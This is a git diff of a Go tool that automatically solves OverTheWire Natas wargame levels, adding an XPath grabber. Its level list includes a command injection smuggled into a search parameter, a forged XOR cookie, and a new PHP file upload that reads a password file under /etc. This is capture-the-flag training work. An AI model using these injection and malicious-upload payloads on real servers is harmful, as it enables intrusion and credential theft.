@@ -12,6 +12,8 @@ import (
 	"net/url"
 	"strings"
 
+	xmlpath "gopkg.in/xmlpath.v2"
+
 	"github.com/MJKWoolnough/errors"
 	"github.com/MJKWoolnough/memio"
 )
@@ -58,6 +60,23 @@ func (p Prefixed) Grab(r http.Request) string {
 	return source[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]
 }
 
+type XPath struct {
+	Grabber
+	Path string
+}
+
+func (x XPath) Grab(r http.Request) string {
+	p := xmlpath.MustCompile(x.Path)
+	source := x.Grabber.Grab(r)
+	h, err := xmlpath.ParseHTML(strings.NewReader(source))
+	e(err)
+	str, ok := p.String(h)
+	if !ok {
+		panic(errors.Error("failed to get xpath data"))
+	}
+	return str
+}
+
 type Path struct {
 	Grabber
 	Path Grabber
@@ -93,7 +112,7 @@ type Post struct {
 }
 
 type File struct {
-	Field, Name string
+	Field, Name Grabber
 	memio.Buffer
 }
 
@@ -110,7 +129,7 @@ func (p Post) Grab(r http.Request) string {
 	m := multipart.NewWriter(&b)
 	p.Data.Set(r, MPSetter{m})
 	if p.File != nil {
-		rw, err := m.CreateFormFile(p.File.Field, p.File.Name)
+		rw, err := m.CreateFormFile(p.File.Field.Grab(r), p.File.Name.Grab(r))
 		e(err)
 		io.Copy(rw, p.File)
 	}
@@ -261,6 +280,7 @@ var levels = [...]Grabber{
 	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
 	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
 	Headers{Prefixed{grab, "The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
+	Path{grab, Combine{Text{"/"}, Post{XPath{grab, "//a/@href"}, SetData{"filename": Combine{XPath{grab, "//form/input[@name='filename']/@value"}, Text{".php"}}}, &File{XPath{grab, "//form/input[@type='file']/@name"}, Text{"exploit.php"}, memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>")}}}},
 }
 
 func e(err error) {
